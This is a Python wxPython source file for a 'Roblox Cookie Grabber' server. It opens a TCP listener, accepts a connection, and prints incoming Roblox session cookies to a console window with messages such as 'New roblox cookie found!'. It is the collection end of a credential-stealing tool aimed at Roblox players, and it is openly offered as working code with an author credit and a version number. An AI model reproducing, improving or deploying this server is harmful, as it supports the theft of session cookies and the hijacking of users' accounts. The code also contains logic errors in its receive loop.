import ipaddress
import socket
import threading
import wx
import os
import subprocess
import re

from modules.template import GUIserver


class Frame(GUIserver):
    def __init__(self, parent, title):
        super(Frame, self).__init__(parent, title=title, size=(800, 800))

        self.btnStart.Bind(wx.EVT_BUTTON, self.onStartServer)
        self.btnStop.Bind(wx.EVT_BUTTON, self.stop)
        self.btnRestart.Bind(wx.EVT_BUTTON, self.restart)

        self.tbIP.Bind(wx.EVT_TEXT_ENTER, self.onTextEnter)
        self.tbPORT.Bind(wx.EVT_TEXT_ENTER, self.onTextEnter)

        # get print value at windows console
        self.tbConsole.AppendText(
            '''
** Roblox Cookie Server **
** Made by: github@whrgo **
** Version: 0.2 **
'''
        )
        self.tbConsole.AppendText("---------------------------\n")

        self.tbConsole.AppendText(
            subprocess.check_output("ipconfig", shell=True).decode())

        # self.tbIP.SetValue(ip_address)

        self.InitUI()
        self.Show()
        self.Centre()

    def InitUI(self): ...

    def onTextEnter(self, event):
        self.ADDR = (str(self.tbIP.GetValue()), int(self.tbPORT.GetValue()))

        ServerStartThread = threading.Thread(target=self.run)
        ServerStartThread.start()

    def onStartServer(self, event):
        try:
            self.tbConsole.Clear()

            addr_ip = str(self.tbIP.GetLineText(0))
            addr_port = int(self.tbPORT.GetLineText(0))

            self.ADDR = (str(addr_ip), int(addr_port))
        except Exception as e:
            self.print(e)
            return

        ServerStartThread = threading.Thread(
            target=self.run)
        ServerStartThread.start()

    def run(self):
        self.tbConsole.Clear()
        addr = self.ADDR

        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.bind(addr)
            self.s.listen(10)

        except Exception as e:
            self.print(e)
            return

        wx.MessageBox("Server started successfully!")
        self.print(
            f"Server Started! (Server is listening at {addr[0]}:{addr[1]})")

        sock, ad = self.s.accept()

        self.print(
            f"New connection found at {ad}"
        )

        while True:
            while True:
                data = sock.recv(1024).decode()
                if not data:
                    break
                if data == 'False':
                    self.print("No cookie found!")
                    break
                self.print(f"New roblox cookie found!")
                self.print(data)
                break

            sock.close()

    def stop(self, event):
        self.s.close()
        wx.MessageBox("Server stopped successfully!")
        self.tbConsole.Clear()

    def restart(self, event):
        ReturnValue = wx.MessageBox("Are you sure to restart server?",
                                    "Restart", wx.YES_NO | wx.ICON_WARNING)
        if (ReturnValue == 2):  # YES
            try:
                self.s.close()
            except:
                pass
            finally:
                self.onStartServer(None)
        else:  # NO
            pass

        # self.stop()

    def print(self, string):
        if self.tbConsole.GetLineText(0):
            self.tbConsole.AppendText("\n")
        self.tbConsole.AppendText(string)


if __name__ == '__main__':
    app = wx.App()
    Frame(None,  'Server (Roblox Cookie Grabber)')
    app.MainLoop()

while True:
    pass
